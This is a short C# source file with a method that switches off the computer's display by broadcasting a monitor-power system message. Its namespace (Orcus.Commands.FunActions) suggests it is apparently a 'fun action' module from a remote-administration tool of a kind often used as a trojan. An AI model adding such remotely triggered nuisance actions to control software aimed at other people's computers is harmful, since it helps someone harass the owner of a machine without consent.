using System;
using Orcus.Native;

namespace Orcus.Commands.FunActions
{
    internal static class Monitor
    {
        // ReSharper disable InconsistentNaming
        private const int HWND_BROADCAST = 0xFFFF;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MONITORPOWER = 0xF170;
        // ReSharper restore InconsistentNaming

        public static void TurnOff()
        {
            NativeMethods.SendMessage(new IntPtr(HWND_BROADCAST), WM_SYSCOMMAND, new IntPtr(SC_MONITORPOWER),
                new IntPtr(2));
        }
    }
}